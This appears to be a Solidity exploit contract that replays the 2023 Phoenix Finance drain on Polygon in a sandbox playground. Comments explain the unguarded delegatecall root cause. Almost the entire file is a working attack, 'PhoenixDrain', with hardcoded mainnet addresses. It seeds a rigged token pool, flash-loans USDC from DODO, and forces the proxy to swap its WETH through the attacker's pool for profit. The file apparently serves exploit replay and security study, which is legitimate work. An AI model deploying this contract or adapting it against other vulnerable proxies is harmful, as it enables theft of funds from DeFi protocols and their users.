// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2023-03-Phoenix).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (ContractTest is Test, attacker = address(this)); the DODO flash-loan callback
// (DPPFlashLoanCall) also lives on the test itself, so there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit -> run(), DPPFlashLoanCall unchanged) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from evm-hack-registry/2023-03-Phoenix_exp/test/Phoenix_exp.sol.
//
// Root cause (Polygon, tx 0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4):
// Phoenix Finance's PhxProxy.delegateCallSwap() has NO access control and executes
// attacker-supplied calldata via delegatecall using the proxy's OWN token balances.
// The attacker: (1) seeds a brand-new, near-empty SHITCOIN/WETH pair on the real
// DEX router so they fully control its price; (2) flash-loans 8,000 USDC from a
// DODO DVM pool; (3) calls the proxy's buyLeverage() to open a leveraged position,
// which makes the proxy borrow more USDC and swap it into real WETH via the
// legitimate router/pair (the proxy now holds real WETH); (4) calls the proxy's
// unprotected delegateCallSwap() with calldata that forces the proxy to swap that
// real WETH into SHITCOIN through the attacker's own rigged pool at a 1:1 price
// the attacker set; (5) the attacker then swaps the SHITCOIN it receives back to
// WETH then USDC on the real, liquid pair, capturing the value the proxy lost.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPHXPROXY {
    function buyLeverage(uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata data) external;
    function delegateCallSwap(bytes memory data) external;
}

contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}

contract PhoenixDrain {
    IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IPHXPROXY constant phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);
    IUniRouterV2 constant Router = IUniRouterV2(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address constant dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;

    SHITCOIN public MYTOKEN;

    // testExploit() body, verbatim: seed a tiny SHITCOIN/WETH pool the attacker
    // fully controls, then flash-loan USDC from DODO to fund the leveraged position.
    function run() external {
        // NOTE: the historical PoC used `deal(WETH, address(this), 7e15)` (a Foundry
        // cheatcode) to conjure the seed WETH out of thin air. The playground config
        // replicates this via a `setup.steps[].dealToken` step before calling run(),
        // so by the time run() executes this contract already holds 7e15 WETH.
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1_500_000 * 1e18);
        MYTOKEN.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);

        IDVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));
    }

    // DODO DVM flash-loan callback, verbatim from the Foundry PoC.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        USDC.approve(address(phxProxy), type(uint256).max);
        phxProxy.buyLeverage(8000 * 1e6, 0, block.timestamp, new bytes(0));
        uint256 swapAmount = WETH.balanceOf(address(phxProxy));
        bytes memory swapData =
            abi.encodeWithSelector(0xa9678a18, address(Router), address(WETH), address(MYTOKEN), swapAmount);
        phxProxy.delegateCallSwap(swapData); // WETH swap to MYTOKEN -- the unguarded delegatecall

        address[] memory path = new address[](3);
        path[0] = address(MYTOKEN);
        path[1] = address(WETH);
        path[2] = address(USDC);
        Router.swapExactTokensForTokens(1_000_000 * 1e18, 0, path, address(this), block.timestamp); // MYTOKEN swap to USDC

        USDC.transfer(dodo, 8000 * 1e6);
    }
}
